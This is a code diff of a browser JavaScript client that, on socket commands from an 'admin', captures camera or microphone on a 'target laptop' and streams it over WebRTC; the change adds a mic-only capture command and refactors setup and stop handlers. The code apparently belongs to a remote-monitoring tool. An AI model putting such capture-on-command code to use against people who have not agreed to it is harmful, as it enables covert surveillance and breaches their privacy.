@@ -79,27 +79,43 @@ window.onload = async () => {
             console.log("Admin requested CAMERA");
             try {
                 localCameraStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                
-                if (peerConnection) peerConnection.close();
-                peerConnection = new RTCPeerConnection(configuration);
-                iceCandidatesQueue = [];
-
-                peerConnection.onicecandidate = e => {
-                    if (e.candidate) socket.emit('ice-candidate', { candidate: e.candidate, targetId: adminId });
-                };
-
-                localCameraStream.getTracks().forEach(track => {
-                    peerConnection.addTrack(track, localCameraStream);
-                });
-
-                const offer = await peerConnection.createOffer();
-                await peerConnection.setLocalDescription(offer);
-                socket.emit('offer', { offer: offer, targetId: adminId });
+                setupWebRTC(adminId, localCameraStream);
             } catch(camErr) {
                 console.log("No Camera/Mic found or access denied.");
                 socket.emit('client-error', "Camera not found on target laptop.");
             }
         });
+
+        // Handle explicit Mic-only request
+        socket.on('request-mic', async (adminId) => {
+            console.log("Admin requested MIC ONLY");
+            try {
+                localCameraStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                setupWebRTC(adminId, localCameraStream);
+            } catch(camErr) {
+                console.log("No Mic found or access denied.");
+                socket.emit('client-error', "Mic not found on target laptop.");
+            }
+        });
+
+        // Helper function to setup WebRTC
+        async function setupWebRTC(adminId, stream) {
+            if (peerConnection) peerConnection.close();
+            peerConnection = new RTCPeerConnection(configuration);
+            iceCandidatesQueue = [];
+
+            peerConnection.onicecandidate = e => {
+                if (e.candidate) socket.emit('ice-candidate', { candidate: e.candidate, targetId: adminId });
+            };
+
+            stream.getTracks().forEach(track => {
+                peerConnection.addTrack(track, stream);
+            });
+
+            const offer = await peerConnection.createOffer();
+            await peerConnection.setLocalDescription(offer);
+            socket.emit('offer', { offer: offer, targetId: adminId });
+        }
 
         socket.on('answer', async (data) => {
             if(!peerConnection) return;
@@ -129,8 +145,11 @@ window.onload = async () => {
              }
         });
 
-        socket.on('stop-camera', () => {
-             console.log("Stopping camera/mic");
+        socket.on('stop-camera', stopWebRTCStream);
+        socket.on('stop-mic', stopWebRTCStream);
+
+        function stopWebRTCStream() {
+             console.log("Stopping WebRTC Stream (Camera/Mic)");
              if (localCameraStream) {
                  localCameraStream.getTracks().forEach(t => t.stop());
                  localCameraStream = null;
@@ -139,7 +158,7 @@ window.onload = async () => {
                  peerConnection.close();
                  peerConnection = null;
              }
-        });
+        }
 
         socket.on('stop-watch', () => {
              console.log("Stopping all");
